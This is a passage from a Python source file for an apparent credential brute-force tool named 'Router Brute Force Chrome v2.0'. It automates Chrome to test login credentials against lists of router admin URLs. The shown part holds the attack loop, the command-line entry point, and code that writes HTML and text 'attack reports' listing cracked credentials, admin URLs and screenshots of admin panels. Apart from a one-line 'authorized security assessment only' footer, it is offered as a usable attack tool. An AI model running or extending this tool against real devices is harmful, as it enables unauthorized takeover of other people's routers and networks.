                            <strong>Vulnerabilities:</strong> {len(result['vulnerabilities'])}
                        </div>
                    </div>
"""
                
                if result['vulnerabilities']:
                    for vuln in result['vulnerabilities']:
                        html_content += f"""
                    <div class="vulnerability">
                        <h4>🔒 {vuln['type']}</h4>
                        <p><strong>Credentials:</strong> {vuln['credentials']}</p>
                        <p><strong>Admin URL:</strong> {vuln['admin_url']}</p>
                        <p><strong>Verified:</strong> {'✅ Yes' if vuln['verified'] else '❌ No'}</p>
"""
                        
                        if vuln['router_info']:
                            html_content += """
                        <h5>📊 Router Information:</h5>
                        <div class="info-grid">
"""
                            for key, value in vuln['router_info'].items():
                                if value and value != "Unknown":
                                    html_content += f"""
                            <div class="info-item">
                                <strong>{key.replace('_', ' ').title()}:</strong> {value}
                            </div>
"""
                            html_content += """
                        </div>
"""
                        
                        if vuln.get('screenshot'):
                            html_content += f"""
                        <div class="screenshot">
                            <h5>📸 Screenshot:</h5>
                            <img src="{vuln['screenshot']}" alt="Admin Panel Screenshot">
                            <p><em>Screenshot: {vuln['screenshot']}</em></p>
                        </div>
"""
                        html_content += """
                    </div>
"""
                
                html_content += """
                </div>
            </div>
"""
            
            html_content += f"""
        </div>
        
        <div class="footer">
            <p>Generated by Router Brute Force Chrome v2.0</p>
            <p>Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><em>For authorized security assessment only</em></p>
        </div>
    </div>
</body>
</html>
"""
            
            # Save HTML report
            report_filename = f"router_brute_force_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            with open(report_filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"{Colors.GREEN}[+] HTML report generated: {report_filename}{Colors.END}")
            return report_filename
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error generating HTML report: {e}{Colors.END}")
            return None
    
    def generate_txt_report(self, results):
        """Generate TXT report with details"""
        try:
            report_filename = f"router_brute_force_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(report_filename, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("ROUTER BRUTE FORCE CHROME v2.0 - ATTACK REPORT\n")
                f.write("=" * 80 + "\n")
                f.write(f"Report generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total URLs tested: {len(results)}\n")
                f.write(f"Login pages found: {stats['login_pages_found']}\n")
                f.write(f"Vulnerable routers: {stats['vulnerable_routers']}\n")
                f.write(f"Attack duration: {time.time() - stats['start_time']:.1f} seconds\n")
                f.write("=" * 80 + "\n\n")
                
                for i, result in enumerate(results, 1):
                    f.write(f"TARGET #{i}: {result['url']}\n")
                    f.write("-" * 40 + "\n")
                    
                    if result['vulnerabilities']:
                        f.write("STATUS: VULNERABLE\n")
                        for vuln in result['vulnerabilities']:
                            f.write(f"  Type: {vuln['type']}\n")
                            f.write(f"  Credentials: {vuln['credentials']}\n")
                            f.write(f"  Admin URL: {vuln['admin_url']}\n")
                            f.write(f"  Verified: {'Yes' if vuln['verified'] else 'No'}\n")
                            
                            if vuln['router_info']:
                                f.write("  Router Information:\n")
                                for key, value in vuln['router_info'].items():
                                    if value and value != "Unknown":
                                        f.write(f"    {key.replace('_', ' ').title()}: {value}\n")
                            
                            if vuln.get('screenshot'):
                                f.write(f"  Screenshot: {vuln['screenshot']}\n")
                    else:
                        f.write("STATUS: SECURE\n")
                    
                    f.write("\n")
            
            print(f"{Colors.GREEN}[+] TXT report generated: {report_filename}{Colors.END}")
            return report_filename
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error generating TXT report: {e}{Colors.END}")
            return None

    def run_brute_force(self):
        """Run brute force attack on all URLs"""
        print("-" * 80)
        
        all_results = []
        
        # Process URLs one by one for organized output
        for i, url in enumerate(self.login_urls):
            if not running:
                break
            
            result = self.brute_force_single_url(url)
            if result:
                all_results.append(result)
            
            # Update progress
            completed = i + 1
            progress = (completed / len(self.login_urls)) * 100
            
            print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.login_urls)} ({progress:.1f}%) - "
                  f"URLs tested: {stats['targets_scanned']}, Vulnerable: {stats['vulnerable_routers']}{Colors.END}")
        
        return all_results

def parse_login_urls(url_input):
    """Parse login URLs from input"""
    urls = []
    
    if url_input.endswith('.txt'):  # File
        try:
            with open(url_input, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {url_input}{Colors.END}")
            return []
    else:  # Single URL or comma-separated URLs
        urls = [url.strip() for url in url_input.split(',') if url.strip()]
    
    return urls

def main():
    parser = argparse.ArgumentParser(description="Router Brute Force Chrome v2.0 - Chrome-based Router Brute Force Tool")
    parser.add_argument('-u', '--urls', required=True, help='Login URL(s): single URL, comma-separated URLs, or file')
    parser.add_argument('-T', '--threads', type=int, default=1, help='Number of threads (default: 1)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--no-headless', action='store_true', help='Run Chrome in visible mode (default: headless)')
    parser.add_argument('--no-screenshot', action='store_true', help='Disable screenshot capture (default: enabled)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    if not CHROME_AVAILABLE:
        print(f"{Colors.RED}[!] Chrome automation not available. Please install selenium and chromedriver.{Colors.END}")
        return
    
    login_urls = parse_login_urls(args.urls)
    if not login_urls:
        print(f"{Colors.RED}[!] No valid login URLs found{Colors.END}")
        return
    
    # Startup info
    print(f"{Colors.GREEN}[+] Loaded {len(login_urls)} login URLs{Colors.END}")
    creds_str = ", ".join([f"{u}:{p}" for u,p in TARGET_CREDENTIALS[:5]])  # Show first 5
    print(f"{Colors.YELLOW}[*] Target credentials: {creds_str}...{Colors.END}")
    print(f"{Colors.BLUE}[*] Chrome-based brute force with screenshot capture{Colors.END}")
    print(f"{Colors.MAGENTA}[*] Workflow: Chrome → Login Form Detection → Credential Testing → Screenshot{Colors.END}")
    
    enable_screenshot = not args.no_screenshot
    headless = not args.no_headless
    
    brute_force = ChromeRouterBruteForce(login_urls, args.threads, args.timeout, headless, enable_screenshot)
    stats['start_time'] = time.time()
    
    try:
        results = brute_force.run_brute_force()
        
        if results:
            total_time = time.time() - stats['start_time']
            
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] CHROME BRUTE FORCE COMPLETE!{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total URLs tested: {Colors.CYAN}{len(results)}{Colors.END}")
            print(f"  - Login pages found: {Colors.BLUE}{stats['login_pages_found']}{Colors.END}")
            print(f"  - Vulnerable routers: {Colors.RED}{stats['vulnerable_routers']}{Colors.END}")
            if stats['vulnerable_routers']:
                print("  - Vulnerable list:")
                for res in results:
                    if res.get('vulnerabilities'):
                        v = res['vulnerabilities'][0]
                        print(f"    • {Colors.WHITE}{res['url']}{Colors.END} -> {Colors.RED}{v['credentials']}{Colors.END}")
            print(f"  - Attack duration: {Colors.MAGENTA}{total_time:.1f}{Colors.END} seconds")
            print(f"  - Average speed: {Colors.YELLOW}{len(results)/total_time:.1f}{Colors.END} URLs/second")
            print(f"{Colors.GREEN}[*] Chrome-based brute force completed successfully{Colors.END}")
            
            # Generate reports
            print(f"\n{Colors.CYAN}[*] Generating reports...{Colors.END}")
            html_report = brute_force.generate_html_report(results)
            txt_report = brute_force.generate_txt_report(results)
            
            if html_report and txt_report:
                print(f"{Colors.GREEN}[+] Reports generated successfully:{Colors.END}")
                print(f"  - HTML Report: {Colors.CYAN}{html_report}{Colors.END}")
                print(f"  - TXT Report: {Colors.CYAN}{txt_report}{Colors.END}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Brute force interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during brute force: {e}{Colors.END}")

if __name__ == "__main__":
    main()